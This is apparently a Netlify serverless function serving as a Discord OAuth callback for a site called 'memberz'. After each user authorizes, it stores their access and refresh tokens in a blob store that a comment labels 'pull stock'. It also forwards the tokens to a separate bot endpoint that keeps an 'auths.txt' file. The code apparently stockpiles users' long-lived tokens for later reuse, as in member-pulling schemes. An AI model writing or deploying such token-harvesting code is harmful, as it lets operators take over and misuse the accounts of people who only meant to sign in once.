import { getStore } from "@netlify/blobs";

export default async (req) => {
  const url  = new URL(req.url);
  const code = url.searchParams.get("code");

  if (!code) {
    return Response.json({ error: "No code provided" }, { status: 400 });
  }

  // Exchange code for tokens
  const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      client_id:     process.env.DISCORD_CLIENT_ID,
      client_secret: process.env.DISCORD_CLIENT_SECRET,
      grant_type:    "authorization_code",
      code:          code,
      redirect_uri:  "https://memberz.netlify.app/",
    }),
  });

  const tokenData = await tokenRes.json();

  if (!tokenRes.ok) {
    return Response.json(
      { error: tokenData.error_description || tokenData.error || "Token exchange failed" },
      { status: 400 }
    );
  }

  const { access_token, refresh_token } = tokenData;

  // Get user info
  const userRes  = await fetch("https://discord.com/api/users/@me", {
    headers: { Authorization: `Bearer ${access_token}` },
  });
  const user     = await userRes.json();
  const username = user.username ?? "unknown";
  const user_id  = user.id;

  // ── Save directly to Netlify Blobs (pull stock) ──────────────────────────
  try {
    const store = getStore("auths");
    await store.setJSON(user_id, {
      user_id,
      username,
      access_token,
      refresh_token,
      saved_at: new Date().toISOString(),
    });
    console.log(`Saved auth to Blobs for ${username} (${user_id})`);
  } catch (e) {
    console.error("Blobs save error:", e.message);
    // Don't fail the whole request — still forward to bot below
  }

  // ── Also forward to the bot so auths.txt stays in sync ───────────────────
  const botUrl    = process.env.BOT_URL;
  const apiSecret = process.env.API_SECRET;

  if (botUrl && apiSecret) {
    await fetch(`${botUrl}/save-auth`, {
      method:  "POST",
      headers: {
        "Content-Type":  "application/json",
        "Authorization": apiSecret,
      },
      body: JSON.stringify({ user_id, username, access_token, refresh_token }),
    }).catch(e => console.error("Bot save error:", e.message));
  }

  return Response.json({ ok: true, username });
};

export const config = { path: "/callback" };
